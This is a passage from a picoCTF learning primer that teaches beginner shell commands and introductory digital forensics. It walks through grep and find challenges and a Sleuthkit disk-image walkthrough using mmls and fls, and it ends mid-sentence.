                                    website to log into the shell at the link below</strong> (or in the "Webshell" panel
                                on the picoCTF website) For the sake of security, you will not see your password
                                as you type it in.
                            </p>
                        </div>
                        <div class="paragraph">
                            <p><a href="https://webshell.picoctf.org/" class="bare">https://webshell.picoctf.org/</a>
                            </p>
                        </div>
                    </div>
                    <div class="sect3">
                        <h4 id="_debrief">2.3.3. Debrief</h4>
                        <div class="paragraph">
                            <p>Congratulations (esp. if this is your first time staring at a command prompt)!
                                The next section focuses on demystifying the shell by relating its usage to
                                devices you&#8217;ve probably already used for years; and if not, you&#8217;ll join the
                                ranks of those whose first language is Shell.</p>
                        </div>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_gui_fu_to_shell_fu">2.4. GUI-fu to Shell-fu</h3>
                    <div id="shl-gui-fu-to-shell-fu" class="paragraph">
                        <p>Our first language as children, whether Spanish, English or anything else
                            primarily for communication with other humans, likely took little conscious
                            effort on our part. For anyone who has learned a second language, it was quite
                            the opposite: very little - if anything - came naturally. Learning Shell for
                            someone who has only "spoken" GUI is like learning a second language. This is
                            good news and bad news. The good news is that Shell and GUI are languages for
                            something you&#8217;ve been using for probably years, but the bad news is there is a
                            whole new vocabulary with only a handful of cognates (words that sound and mean
                            the same in both languages) here and there.</p>
                    </div>
                    <div class="paragraph">
                        <p>The basic computer operations that everyone is familiar with in GUI&#8217;s can
                            easily be done in the shell as well. Here&#8217;s some of the most common operations
                            for anyone using a computing device:</p>
                    </div>
                    <table class="tableblock frame-all grid-all stretch">
                        <caption class="title">Table 1. Basic computer operations</caption>
                        <colgroup>
                            <col style="width: 20%;">
                            <col style="width: 20%;">
                            <col style="width: 20%;">
                            <col style="width: 20%;">
                            <col style="width: 20%;">
                        </colgroup>
                        <thead>
                            <tr>
                                <th class="tableblock halign-left valign-top">Operation</th>
                                <th class="tableblock halign-left valign-top">GUI action</th>
                                <th class="tableblock halign-left valign-top">Shell action</th>
                                <th class="tableblock halign-left valign-top">Shell example</th>
                                <th class="tableblock halign-left valign-top">Note</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Start app</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Click or touch icon of app</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Type name of app and press enter</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock"><code>$ date</code></p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Pressing the Enter key sends the command to the shell to run
                                        and return.</p>
                                </td>
                            </tr>
                            <tr>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Open file</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Browse to file, click</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Use <code>cat</code> app to print file</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock"><code>$ cat ~/my-file.txt</code></p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock"><code>cat</code> displays all text in a file.</p>
                                </td>
                            </tr>
                            <tr>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Download app</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Browse app store, click</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Use <code>apt</code> to download app</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock"><code>$ apt install chessx</code></p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Install ChessX game. The hard part was finding a relevant
                                        package name.</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <div class="paragraph">
                        <p>As the table above shows, using a GUI involves browsing and clicking, while
                            using a shell involves knowing a good app to use. Google has made finding the
                            right app for a shell interface much easier than it was years ago. As always
                            for CTF&#8217;s, Google is your friend! However, more direct resources can be even
                            more helpful, such as this website below that quickly explains shell commands:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://explainshell.com/explain?cmd=date"
                                class="bare">https://explainshell.com/explain?cmd=date</a></p>
                    </div>
                    <div class="paragraph">
                        <p>However, things do not always go as planned. The next section deals with
                            those sorts of situations that inevitably arise.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_what_the_shell">2.5. What the Shell!?</h3>
                    <div id="shl-what-the-shell" class="paragraph">
                        <p>The main severity in the learning curve with the shell is that you must know
                            the apps and commands available to you either by memorization or by looking
                            them up when you need them. Certainly, it is faster to memorize as many as
                            possible.</p>
                    </div>
                    <div class="paragraph">
                        <p>The other challenge is the amount of typing that sometimes must be done to
                            reference the intended file.</p>
                    </div>
                    <div class="paragraph">
                        <p>Lastly, interfacing with apps also requires memorizing or looking up names of
                            parameters or arguments.</p>
                    </div>
                    <div class="paragraph">
                        <p>To summarize, some of the most challenging aspects of using the shell:</p>
                    </div>
                    <div class="olist arabic">
                        <ol class="arabic">
                            <li>
                                <p>Memorizing commands (aka apps/programs)</p>
                            </li>
                            <li>
                                <p>Typing out long commands</p>
                            </li>
                            <li>
                                <p>Memorizing arguments for commands</p>
                            </li>
                        </ol>
                    </div>
                    <div class="sect3">
                        <h4 id="_challenge_1_memorizing_commands">2.5.1. Challenge 1: Memorizing commands</h4>
                        <div class="paragraph">
                            <p>Having a cheat sheet with shell commands listed is a must for overcoming the
                                challenge of memorizing commands. Printing it out is a bonus if possible!
                                (Saves screen space). The cheat sheet linked below is very good!</p>
                        </div>
                        <div class="paragraph">
                            <p><a href="https://www.git-tower.com/blog/command-line-cheat-sheet/"
                                    class="bare">https://www.git-tower.com/blog/command-line-cheat-sheet/</a></p>
                        </div>
                    </div>
                    <div class="sect3">
                        <h4 id="_challenge_2_typing_out_long_commands">2.5.2. Challenge 2: Typing out long commands</h4>
                        <div class="paragraph">
                            <p>Many wonderfully brilliant students of mine have not known how to speed up
                                their typing in the shell command prompt until thousands of picoCTF points into
                                their learning. I take responsibility for this, and really, most of us go
                                through that phase, but we do not have to! One word:</p>
                        </div>
                        <div class="paragraph">
                            <p><strong>TAB</strong></p>
                        </div>
                        <div class="paragraph">
                            <p>In the shell, pressing the TAB key invokes auto-complete by 1. assuming you&#8217;ve
                                spelled the command or file correctly up to the point of pressing tab, and 2.
                                completing the command or file name as much as it can.</p>
                        </div>
                        <div class="paragraph">
                            <p>The functionality of auto-complete in the shell is so different from
                                auto-complete in other apps, such as those in a phone, that shell auto-complete
                                is often referred to as tab-complete. It takes some practice to get used to,
                                but it is worth the time as it probably cuts number of key presses in half!</p>
                        </div>
                        <div class="paragraph">
                            <p>Unlike auto-complete for a soft keyboard on a phone, tab-complete is never
                                wrong, however, this is mostly because it makes no guesses and only helps with
                                completing commands and file paths and names. It hardly ever helps complete
                                arguments to commands besides file names. If pressing tab doesn&#8217;t do anything,
                                this is either because 1. there is no such command or file name to complete
                                what you&#8217;ve already typed into the command prompt, or 2. there are multiple
                                commands or file names that could complete what you&#8217;ve already typed into the
                                command prompt. Try typing another letter or two. Hit the tab key again. If
                                nothing more is completed, hit tab one more time. If nothing really happens
                                besides an angry noise or flash, then there is no way to complete what you&#8217;ve
                                already typed (maybe there is a typo?), but if the issue is that there are
                                multiple possibilities for tab complete to choose, then these options will
                                display after your second strike on the tab key. The double press of tab can
                                be done at any time, but if there are hundreds of options then the shell will
                                ask for your approval before printing all those options because that&#8217;s not
                                usually very helpful.</p>
                        </div>
                        <div class="paragraph">
                            <p>In the next section, I will guide you through some fundamental shell commands
                                to start getting a sense for the world of the shell.</p>
                        </div>
                    </div>
                    <div class="sect3">
                        <h4 id="_shell_nav_exercise_1">2.5.3. Shell Nav Exercise 1</h4>
                        <div class="listingblock">
                            <div class="content">
                                <pre class="pygments highlight"><code><span></span># SOME NOTES:
# * text listed after &quot;$&quot; I mean for you to enter into the shell and then
#   press enter
# * text listed after &quot;#&quot; are comments from me to you but are ignored by
#   the shell
#
# this short tutorial is meant to run through foundational shell commands
# with brief explanations for each

# the following command &quot;parks&quot; your shell in your home directory (which is
# somewhere you can create files!)

$ cd


# the following command shows where your shell is parked

$ pwd


# the following command creates a new directory called &quot;tutorial&quot; where you
# are currently parked

$ mkdir tutorial


# the following command moves your shell and parks it in the &quot;tutorial&quot; folder
# you just created

$ cd tutorial


# pwd stands for &quot;print working directory&quot;. &quot;working directory&quot; is the
# technical term for where one&#39;s shell is parked

$ pwd


# the following command creates an empty file with the name &quot;note.txt&quot;

$ touch note.txt


# the following command list the contents of your working directory

$ ls


# personally, I prefer a one column output of the contents of my working
# directory, like

$ ls -l


# the following command shows the text content of &quot;note.txt&quot; (which is empty
# right now)

$ cat note.txt


# the following command puts &quot;hello world! I&#39;m a snail&quot; into &quot;note.txt&quot;

$ echo &quot;hello world! I&#39;m a snail&quot; &gt; note.txt


# cat will print something now that there is content in &quot;note.txt&quot;

$ cat note.txt


# the following command makes a copy of &quot;note.txt&quot; called &quot;new-note.txt&quot;

$ cp note.txt new-note.txt


# what is in &quot;new-note.txt&quot;?

$ cat new-note.txt


# * the following command opens &quot;new-note.txt&quot; in a terminal text editor
# * try changing the file, then press Ctrl-X to exit and save

$ nano new-note.txt


# if you were successful, this command should print the new content

$ cat new-note.txt


# if you were not successful, that is just fine. revisit this exercise after
# some more reading and practice!</code></pre>
                            </div>
                        </div>
                    </div>
                    <div class="sect3">
                        <h4 id="_picogym_problem">2.5.4. picoGym Problem</h4>
                        <div class="paragraph">
                            <p>Try out your new shell skills with this challenge from the picoGym:</p>
                        </div>
                        <div class="paragraph">
                            <p><a href="https://play.picoctf.org/practice/challenge/189"
                                    class="bare">https://play.picoctf.org/practice/challenge/189</a></p>
                        </div>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_conclusion">2.6. Conclusion</h3>
                    <div class="paragraph">
                        <p>You may have noticed that we did not cover overcoming challenge 3. If you are
                            curious, look up the <code>man</code> command explained in this cheat sheet:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://www.git-tower.com/blog/command-line-cheat-sheet/"
                                class="bare">https://www.git-tower.com/blog/command-line-cheat-sheet/</a></p>
                    </div>
                    <div class="paragraph">
                        <p>Using Google helps with learning commands to help solve problems in the shell,
                            and also the "Explain Shell" website I linked to earlier in this chapter.</p>
                    </div>
                </div>
            </div>
        </div>
        <div class="sect1">
            <h2 id="_forensics">3. Forensics</h2>
            <div class="sectionbody">
                <h5 id="_luke_jones" class="discrete">Luke Jones</h5>
                <div class="paragraph">
                    <p></p>
                </div>
                <hr>
                <div class="sect2">
                    <h3 id="_what_is_forensics">3.1. What is Forensics?</h3>
                    <div class="paragraph">
                        <p>In general, computer science professionals refer to "Digital Forensics" as
                            "Forensics", for simplicity&#8217;s sake. Digital Forensics is the field in
                            cybersecurity that tries to gather and understand evidence after an incident,
                            which can be crime, to determine how it happened. This not only helps law
                            enforcement when pledging someone innocent or guilty, but also to understand
                            how to improve security in a system that was successfully attacked. Digital
                            Forensics focuses on gathering evidence present in computer devices that hold
                            information electronically. It is a branch of Forensic Science, which can also
                            investigate any type of crime even if there is not computer media involved.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_how_to_search_for_strings_and_filenames">3.2. How to search for strings and filenames</h3>
                    <div class="paragraph">
                        <p>We will begin by learning how to search for information in a file system. Go
                            to the picoCTF webshell at:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://webshell.picoctf.org/" class="bare">https://webshell.picoctf.org/</a></p>
                    </div>
                    <div class="paragraph">
                        <p>Once you are connected, open up this problem in a separate tab:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://play.picoctf.org/practice/challenge/85"
                                class="bare">https://play.picoctf.org/practice/challenge/85</a></p>
                    </div>
                    <div class="paragraph">
                        <p>Download the problem file in your webshell by right-clicking the link in the
                            problem description and selecting Copy Address or Copy Link. Then download it
                            by typing in `wget ` and pasting the address after 'wget', space. Your command
                            should look something like this, but is likely to not be exactly the same:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="text"><span></span>$ wget https://jupiter.challenges.picoctf.org/static/495d43ee4a2b9f345a4307d053b4d88d/file</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You need to copy and paste your own link for the file.</p>
                    </div>
                    <div class="paragraph">
                        <p>Great! So now you should have the challenge file saved on your webshell as
                            <code>file</code>. Now what?
                        </p>
                    </div>
                    <div class="paragraph">
                        <p>As a reflex, you should always use the program <code>file</code> on new files that CTF
                            challenges give you. The next command is kind of confusing, because the first
                            word references the program <code>file</code> and the second word references the file
                            named <code>file</code>, but run this command and see what it tells you:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>$ file file</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>If done properly, it should tell you:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="text"><span></span>file: ASCII text, with very long lines</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>This tells us the file is plain text, but has unusually long lines. Since it
                            is plain text, we can use <code>cat</code> to see what it contains.</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>$ cat file</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Running this command will show that the file is mostly made up of gibberish.
                            If this were a cryptography challenge, decoding the gibberish might be what
                            needs to happen, but this is a 100 point general skills question, so I doubt
                            that&#8217;s what needs to happen here. What is the challenge author pushing us
                            towards? There&#8217;s only one hint and it is a <code>grep</code> tutorial. What is grep?
                        </p>
                    </div>
                    <div class="paragraph">
                        <p>Grep is a Linux utility, so we can learn about it by bringing up its man page:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>$ man grep</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>The first line of the man page says:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="text"><span></span>grep, egrep, fgrep, rgrep - print lines that match patterns</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>This is perfect! We want to search through gibberish to find the flag. But how
                            do we specify the pattern to search for and the file to search in? For this,
                            I recommend the grep tutorial in the hint, not the man page. (Man pages tend
                            to be highly technical and can be confusing to novices)</p>
                    </div>
                    <div class="paragraph">
                        <p>One of the first examples in the grep tutorial uses the following command:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="text"><span></span>$ egrep &#39;mellon&#39; mysampledata.txt</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>'mellon' is what is being searched for and it is being searched for in
                            'mysampledata.txt' What if we searched for 'picoCTF' in 'file'? That command
                            would look like:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="text"><span></span>$ egrep &#39;picoCTF&#39; file</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>This should get the flag for you and print it on your screen.</p>
                    </div>
                    <div class="paragraph">
                        <p>Let&#8217;s consider another challenge:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://play.picoctf.org/practice/challenge/320"
                                class="bare">https://play.picoctf.org/practice/challenge/320</a></p>
                    </div>
                    <div class="paragraph">
                        <p>Download the zip file into your webshell like you did for the previous
                            challenge. As before, use <code>file</code> on it right away to have an idea of what
                            you&#8217;re dealing with:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="text"><span></span>$ file files.zip</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You should see the following output:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="text"><span></span>files.zip: Zip archive data, at least v1.0 to extract, compression method=store</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>To see more of this challenge, all we have to do is unzip the archive:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="text"><span></span>$ unzip files.zip</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You&#8217;ll see a lot of output, but you can ignore that for now. List the contents
                            of your current directory to see the new directory called 'files'. Try
                            exploring that a bit with <code>cd</code> and <code>ls</code>, remember that you&#8217;re
                            looking for a
                            file called 'uber-secret.txt'.</p>
                    </div>
                    <div class="paragraph">
                        <p>It may be hard to find 'uber-secret.txt' without the help of a tool. This
                            problem is called 'First Find' and our last problem was called 'First Grep'.
                            Is there a tool called 'find' in Linux? See if there is a manpage:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>man find</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>There is! The first line reads:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="text"><span></span>find - search for files in a directory hierarchy</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>This sounds perfect. Exit the manual by pressing 'q'. As mentioned before,
                            manpages are quite technical and can be overwhelming to try and read when you
                            are first starting out. Let&#8217;s find some simpler examples by Googling. My
                            Google query was <code>find file linux command</code>. I felt the need to specify <code>linux
command</code> because <code>find</code> is such a generic word. My top Google result was this:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://www.plesk.com/blog/various/find-files-in-linux-via-command-line/"
                                class="bare">https://www.plesk.com/blog/various/find-files-in-linux-via-command-line/</a>
                        </p>
                    </div>
                    <div class="paragraph">
                        <p>I especially liked this result because I know plesk is not a commercialized
                            site. Scroll down to the first example under <code>Basic Examples</code>.</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="text"><span></span>find . -name thisfile.txt</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>This command means: starting in the current directory (which is what <code>.</code>, dot
                            means), look in this directory and all subdirectories for the file named
                            'thisfile.txt'. We can slightly modify this example to fit our needs for the
                            challenge.</p>
                    </div>
                    <div class="paragraph">
                        <p>Make sure you are in the 'files' directory for this command. If you unzipped
                            the archive in your home directory, you can use the following command to get
                            back to the 'files' directory:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="text"><span></span>$ cd ~/files</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Once you&#8217;re in the files directory, use this command:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="text"><span></span>$ find . -name uber-secret.txt</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>If you were in the 'files' directory when you ran this command, you should get
                            the following output:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="text"><span></span>./adequate_books/more_books/.secret/deeper_secrets/deepest_secrets/uber-secret.txt</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>This is the path to the file that was found. We&#8217;re going to get into the same
                            directory as this file by following the directories listed in this file path.
                            We know that '.' is our current directory, so our first cd is to
                            'adequate_books'. Remember to use the Tab key to autocomplete unambiguous file
                            and directory names. To explain what I mean by 'unambiguous' here&#8217;s a relevant
                            example of an ambiguous file name in our current context:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>$ cd a</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>If you press the Tab key after only typing 'a' it won&#8217;t autocomplete because
                            there are two directories that start with 'a', 'acceptable_books' and
                            'adequate_books'. The shell doesn&#8217;t know which one you want. To get Tab to
                            autocomplete type the following unambiguous directory name and then strike
                            tab:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>$ cd ad</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>When you press tab, it becomes:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="text"><span></span>$ cd adequate_books/</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>One last note on tab completion. When there is an ambiguous file name that
                            doesn&#8217;t tab complete to something, you can hit the tab key again to see the
                            list of files that could be completed with your given prefix. The other
                            possibility is that there are zero matches on your given prefix, in which
                            case nothing is printed when you hit tab a second time.</p>
                    </div>
                    <div class="paragraph">
                        <p>So now we are in 'adequate_books', what&#8217;s next? From our found file above,
                            'more_books' is after 'adequate_books', so we cd accordingly:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="text"><span></span>$ cd more_books/</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>For this directory, observe the difference between <code>ls -l</code> and
                            <code>ls -al</code>. You&#8217;ll
                            see that an additional directory is shown when the '-a' flag is given. This
                            flag means 'show all (including hidden files and directories)'. In Linux, any
                            file or directory starting with '.' is considered hidden and will only be
                            shown in specific circumstances.
                        </p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>$ cd .secret/
$ cd deeper_secrets/
$ cd deepest_secrets/</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>All of these cd commands could be combined into a single command, but I&#8217;ve
                            broken them up here for clarity and exposition. List the contents of
                            'deepest_secrets':</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>$ ls -al</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>To see the contents of the file, use <code>cat</code>:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="text"><span></span>$ cat uber-secret.txt</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>There&#8217;s the flag for this challenge!</p>
                    </div>
                    <div class="paragraph">
                        <p>Try this slightly more difficult challenge with your new found skills:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://play.picoctf.org/practice/challenge/322"
                                class="bare">https://play.picoctf.org/practice/challenge/322</a></p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_disk_analysis">3.3. Disk analysis</h3>
                    <div class="paragraph">
                        <p>One of the most fundamental skills of a forensics analyst is inspecting and
                            deeply understanding disks. These can be actual hardware or dumps of disks
                            captured in files. There are a few really good GUI tools out there for not
                            just disk analysis, but whole management of digital evidence for cases. Our
                            disk analysis problems will not require any licenses to proprietary software.
                            Some people like to use Autopsy which is a GUI frontend to the tools we will
                            demonstrate how to use in this section. We will use the individual Sleuthkit
                            tools so that you learn a little more than from a GUI that abstracts away some
                            of the details. Disks are all about the details.</p>
                    </div>
                    <div class="sect3">
                        <h4 id="_sleuthkit_intro_presentation">3.3.1. Sleuthkit Intro presentation</h4>
                        <div class="paragraph">
                            <p>We will be considering disk images exclusively, due to the difficulty of
                                sending real hard drives through the Internet at the time of this writing! Try
                                this picoGym problem, which presents the first step in analyzing disk images:</p>
                        </div>
                        <div class="paragraph">
                            <p><a href="https://play.picoctf.org/practice/challenge/301"
                                    class="bare">https://play.picoctf.org/practice/challenge/301</a></p>
                        </div>
                        <div class="paragraph">
                            <p>This problem should be pretty approachable given what you&#8217;ve done leading up
                                to this point, namely downloading individual challenge files and using command
                                line utilities. Something new in this challenge is using netcat or <code>nc</code>. For
                                this challenge, nc is used to access a checker program. This program will check
                                your answer to the challenge and give you the flag if it is correct. For this
                                challenge, the invocation of nc (what you type to run it) is given and is
                                straightforward, but I will explain it for the sake of clarity. Here&#8217;s my given
                                nc invocation: <code>nc saturn.picoctf.net 52279</code> The last number might be
                                different
                                for you, that&#8217;s expected. We&#8217;ll go through what each part of this program
                                call
                                means:</p>
                        </div>
                        <div class="ulist">
                            <ul>
                                <li>
                                    <p><code>nc</code> This, of course, is the name of the program we are running.
                                        Netcat, or
                                        'nc' as this system calls it. Sometimes the program name will be the full
                                        'netcat' variety, but on the webshell, it is 'nc'.</p>
                                </li>
                                <li>
                                    <p><code>saturn.picoctf.net</code> This is the name of the computer we&#8217;re
                                        connecting to.
                                        This is a challenge server that picoCTF runs.</p>
                                </li>
                                <li>
                                    <p><code>52279</code> This is the number of the port we&#8217;re connecting to for
                                        the challenge.
                                        This will probably be different for your challenge.</p>
                                </li>
                            </ul>
                        </div>
                        <div class="paragraph">
                            <p>So go ahead and solve your first Sleuthkit problem on the picoGym and learn the
                                tool, <code>mmls</code>, which we will use for subsequent problems.</p>
                        </div>
                    </div>
                    <div class="sect3">
                        <h4 id="_sleuthkit_apprentice_walkthrough">3.3.2. Sleuthkit Apprentice walkthrough</h4>
                        <div class="paragraph">
                            <p>Here&#8217;s the next challenge in that short series:</p>
                        </div>
                        <div class="paragraph">
                            <p><a href="https://play.picoctf.org/practice/challenge/300"
                                    class="bare">https://play.picoctf.org/practice/challenge/300</a></p>
                        </div>
                        <div class="paragraph">
                            <p>This challenge requires <code>mmls</code> as a first step to use other Sleuthkit tools,
                                but now is the time for some true forensic background.</p>
                        </div>
                        <div class="paragraph">
                            <p>A disk image is a huge dump of many numbers. But these numbers have an
                                invisible structure to them that gives them much more meaning. Navigating
                                this invisible structure manually is tedious and deeply difficult, but the
                                Sleuthkit tools handle this invisible structure for us. To begin using the
                                Sleuthkit tools we must understand some of the layers that apply to disk
                                images. The four main layers are: media, block, inode, and filename.</p>
                        </div>
                        <div class="ulist">
                            <ul>
                                <li>
                                    <p>Media: the media layer tools all are prepended with 'mm' and operate on the
                                        disk image with little guidance from the analyst. <code>mmls</code> is a media
                                        layer
                                        tool that gives us the partition table of the image and key information for
                                        delving into the other layers. Media is the lowest level, providing key
                                        information to access the deeper layers, but not shedding much light on the
                                        data contained in the image.</p>
                                </li>
                                <li>
                                    <p>Block: the block layer is the second lowest level of the four layers
                                        considered here. Block layer tools are prepended with 'blk' in the Sleuthkit.
                                        <code>blkcat</code> is a block layer tool that outputs the contents of a single
                                        block. The
                                        block layer is the numbers of the disk image broken into equal-sized chunks. A
                                        single file is likely to contain multiple blocks.
                                    </p>
                                </li>
                                <li>
                                    <p>Inode: the inode layer is the bookkeeping layer of a disk image. It&#8217;s
                                        like the table of contents, with the chapter numbers being like the inodes,
                                        and the pages like the blocks of a file. Inode layer tools are prepended with
                                        'i'. <code>icat</code> is an inode layer tool that outputs a single file based
                                        on its
                                        inode number.</p>
                                </li>
                                <li>
                                    <p>Filename: the filename layer is one layer that most any user of a computer
                                        actually sees and interacts with. This is the layer with which we will start
                                        our exploration of the Sleuthkit in the current challenge. Interacting with the
                                        filename layer will look a lot like using the shell normally. Filename layer
                                        tools are prepended by 'f'. <code>fls</code> lists the files on an image
                                        starting at the
                                        root. This is what we will use for our exploration of the disk image.</p>
                                </li>
                            </ul>
                        </div>
                        <div class="paragraph">
                            <p>First off, download the challenge file:</p>
                        </div>
                        <div class="listingblock">
                            <div class="content">
                                <pre
                                    class="pygments highlight"><code data-lang="text"><span></span>$ wget https://artifacts.picoctf.net/c/331/disk.flag.img.gz</code></pre>
                            </div>
                        </div>
                        <div class="paragraph">
                            <p>Next, decompress the challenge file:</p>
                        </div>
                        <div class="listingblock">
                            <div class="content">
                                <pre
                                    class="pygments highlight"><code data-lang="text"><span></span>$ gunzip disk.flag.img.gz</code></pre>
                            </div>
                        </div>
                        <div class="paragraph">
                            <p>Dump the partition table of the disk image. We want to find the offset to the
                                main partition:</p>
                        </div>
                        <div class="listingblock">
                            <div class="content">
                                <pre class="pygments highlight"><code data-lang="text"><span></span>$ mmls disk.flag.img

DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000206847   0000204800   Linux (0x83)
003:  000:001   0000206848   0000360447   0000153600   Linux Swap / Solaris x86 (0x82)
004:  000:002   0000360448   0000614399   0000253952   Linux (0x83)</code></pre>
                            </div>
                        </div>
                        <div class="paragraph">
                            <p>It would seem that the fourth partition is the main partition, because it is
                                the largest and has an uneven length. That&#8217;s a bit of a guess, but it&#8217;s for
                                sure either partition labeled 'Linux (0x83)'. Copy the 'Start' value to your
                                clipboard of the fourth partition. Let&#8217;s look at the root of this partition by
                                supplying the 'Start' value to the offset option in <code>fls</code>:</p>
                        </div>
                        <div class="listingblock">
                            <div class="content">
                                <pre class="pygments highlight"><code data-lang="text"><span></span>$ fls -o 360448 disk.flag.img

d/d 11: lost+found
d/d 12: boot
d/d 1985:       etc
d/d 1986:       proc
d/d 1987:       dev
d/d 1988:       tmp
d/d 1989:       lib
d/d 1990:       var
d/d 3969:       usr
d/d 3970:       bin
d/d 1991:       sbin
d/d 451:        home
d/d 1992:       media
d/d 1993:       mnt
d/d 1994:       opt
d/d 1995:       root
d/d 1996:       run
d/d 1997:       srv
d/d 1998:       sys
d/d 2358:       swap
V/V 31745:      $OrphanFiles</code></pre>
                            </div>
                        </div>
                        <div class="paragraph">
                            <p>This looks like the main partition because it has many of the standard linux
                                root directories, like 'home', 'usr', 'root', etc. Remember that <code>fls</code> is
                                part
                                of the filename layer Sleuthkit tools. You can think of <code>fls</code> as standing for
                                'filename list'. Here, it&#8217;s listed all the top-level directories in the disk
                                image.</p>
                        </div>
                        <div class="paragraph">
                            <p>This next part requires some forensic intuition. A lot of these directories
                                are system-generated and maintained. Let&#8217;s focus on the directories that have
